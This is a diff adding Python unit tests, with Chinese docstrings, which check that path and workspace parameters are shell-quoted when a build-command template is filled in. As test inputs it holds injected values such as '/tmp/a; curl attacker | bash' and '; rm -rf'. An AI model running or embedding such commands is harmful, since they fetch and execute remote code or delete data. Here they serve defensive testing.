@@ -76,6 +76,59 @@ def test_standard_parameters_are_shell_quoted_by_default():
     assert prepared.command == "./build.sh --product 'rk3588 userdebug; rm -rf /'"
 
 
+def test_path_parameters_are_quoted_in_shell_context_but_raw_in_path_context():
+    """type=path 双上下文:路径上下文保持裸值供拼接,shell 上下文必须 quote。
+
+    模板把 {output_path} 写进 command 时,"/tmp/a; curl attacker | bash"
+    不得以元字符裸进 bash -lc / shell=True。
+    """
+    server = {"workspace_root": "/srv"}
+    template = {
+        "workspace": "{workspace}",
+        "command": "cp update.img {output_path}",
+        "init_commands": ["echo packing {output_path}"],
+        "parameters_schema": {
+            "workspace": {"required": True},
+            "output_path": {"type": "path", "required": True},
+        },
+    }
+
+    prepared = build_command_from_template(
+        template,
+        server,
+        {
+            "workspace": "/srv/build",
+            "output_path": "/tmp/a; curl attacker | bash",
+        },
+    )
+
+    assert prepared.command == "cp update.img '/tmp/a; curl attacker | bash'"
+    assert prepared.init_commands == ["echo packing '/tmp/a; curl attacker | bash'"]
+    # 路径上下文(workspace 拼接/归一化)不受 quote 影响。
+    assert prepared.workspace == "/srv/build"
+
+
+def test_workspace_placeholder_in_command_is_shell_quoted():
+    """workspace 参数出现在 command 里时同样按 shell 上下文 quote。"""
+    server = {"workspace_root": "/srv"}
+    template = {
+        "workspace": "{workspace}",
+        "command": "cd {workspace} && ./build.sh",
+        "parameters_schema": {
+            "workspace": {"required": True},
+        },
+    }
+
+    prepared = build_command_from_template(
+        template,
+        server,
+        {"workspace": "/srv/my build; rm -rf x"},
+    )
+
+    assert prepared.workspace == "/srv/my build; rm -rf x"
+    assert prepared.command == "cd '/srv/my build; rm -rf x' && ./build.sh"
+
+
 def test_trusted_shell_fragment_requires_pattern_or_choices():
     """显式声明裸插入片段时必须同时提供 pattern/choices 白名单。"""
     server = {"workspace_root": "/srv"}
